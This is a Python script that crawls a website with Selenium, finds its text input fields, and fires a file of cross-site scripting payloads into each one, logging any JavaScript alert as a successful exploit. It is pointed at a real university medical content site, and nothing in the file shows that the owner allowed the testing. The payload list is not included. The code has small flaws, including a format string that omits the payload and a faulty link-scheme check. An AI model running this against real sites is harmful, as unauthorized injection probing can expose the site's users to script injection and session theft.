from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import pandas as pd
import matplotlib.pyplot as plt
from time import sleep
from progress.bar import Bar
from bs4 import BeautifulSoup
import networkx as nx



def is_alerted(driver):
    try:
        alert = driver.switch_to.alert
        return(True)
    except:
        return False


def get_all_xss_attacks():
    with open("attack_vectors/xss.txt") as file:
        texto = file.read()
        vectors = texto.split("\n")
    return(vectors)


def test_vector(driver , xpath_input_object , attack_chunk):
    url  = xpath_input_object['url']
    xpath = xpath_input_object["xpath"]
    for i in attack_chunk:
        try:
            print("\n testing {} at {} in {}".format(i , xpath , url))
            driver.get(url)
            sleep(1)
            element = driver.find_element_by_xpath(xpath)
            element.send_keys(i)
            element.send_keys(Keys.RETURN)
            sleep(0.5)
            if(is_alerted(driver)):
                #it means it was exploited
                print("{} exploited in  {} with ".format(url , xpath , i))
        except:
            print("error exploiting {} in {} at {}".format(i , xpath , url))



def get_all_xpath_inputs(driver , url):
    if(driver.current_url != url):
        driver.get(url)
        sleep(1)
    content = driver.find_element_by_xpath("/html").get_attribute("innerHTML")
    soup = BeautifulSoup(content , "lxml")
    inputs = soup.find_all("input" , {"type":"text"})
    xpaths = []
    for i in inputs:
        xpath = xpath_soup(i)
        xpaths.append(xpath)
    return(xpaths)

#get spath of a soup element
def xpath_soup(element):
    components = []
    child = element if element.name else element.parent
    for parent in child.parents:  # type: bs4.element.Tag
        siblings = parent.find_all(child.name, recursive=False)
        components.append(
            child.name if 1 == len(siblings) else '%s[%d]' % (
                child.name,
                next(i for i, s in enumerate(siblings, 1) if s is child)
                )
            )
        child = parent
    components.reverse()
    return '/%s' % '/'.join(components)


def get_hrefs( driver , main_url):
    try:
        driver.get(main_url)
        #sleep depends on internet velocity, if internet is faster sleep can be slower
        sleep(1)
        webpage_content = driver.find_element_by_xpath("/html")
        content = webpage_content.get_attribute("innerHTML")
        soup = BeautifulSoup(content , "lxml")
        elements_with_hrefs = soup.find_all("a")
        hrefs = []
        for i in elements_with_hrefs:
            link = i['href']
            try:
                if(link[0]== "/"):
                    link = main_url+link
            except:
                pass
            try:
                if((link[0]!= "h")and(link[1]!="t")and(link[2]!="t")and(link[3]!="p")):
                    link = main_url+"/"+link
            except:
                pass
            hrefs.append(link)
        return(hrefs)
    except Exception as e:
        print("returned null because of error ", e)
        return([])

def check_list(elem , lista):
    for i in lista:
        if(elem == i["son"]):
            return(False)
    return(True)

def recursively_scrawl(driver , main_url , deph):
    start = get_hrefs(driver , main_url)
    first = []
    for i in start:
        father = main_url
        son = i
        couple = {
            "father":father,
            "son":son
        }
        first.append(couple)

    for i in range(deph-1):
        print("\n {} recursion".format(i+1))
        bar = Bar("progress..." , max=len(first))
        for num in range ( len(first)):
            bar.next()
            j = first[num]
            hrefs = get_hrefs(driver, j["son"])
            for k in hrefs:
                if(check_list(k , first)):
                    father = j
                    son = k
                    couple = {
                        "father":father,
                        "son":son
                    }
                    first.append(couple)
            #print(len(first) , i+1 )
    return(first)

def generate_graph(son_father_list):
    touples = []
    G = nx.Graph()
    for i in son_father_list:
        left = i["father"]
        right = i["son"]
        try:
            G.add_edge(left, right)
        except:
            pass
        touple = (left,right)
        touples.append(touple)

    #print(touples)
    nx.draw(G)
    plt.show()



def get_xpaths_inputs_recursiveley(driver , root_url , depth):
    print("getting all urls... \n")
    cont = recursively_scrawl(driver , root_url , depth )
    print("there are {} to test".format(len(cont)))
    all_xpaths = []
    print("getting xpaths ... \n ")
    barr = Bar("progress getting xpaths " , max=len(cont))
    for i in cont:
        barr.next()
        try:
            xpaths = get_all_xpath_inputs(driver , i["son"])
            for j in xpaths:
                info = {
                    "url":i["son"],
                    "xpath":j
                }
                all_xpaths.append(info)
        except Exception as e:
            pass
    return(all_xpaths)


driver = webdriver.Chrome()
goal = get_xpaths_inputs_recursiveley(driver , "https://tmedweb.tulane.edu/content_open" , 1)
xss_vectors = get_all_xss_attacks()
for i in goal:
    test_vector(driver , i , xss_vectors)

print(goal)

driver.close()

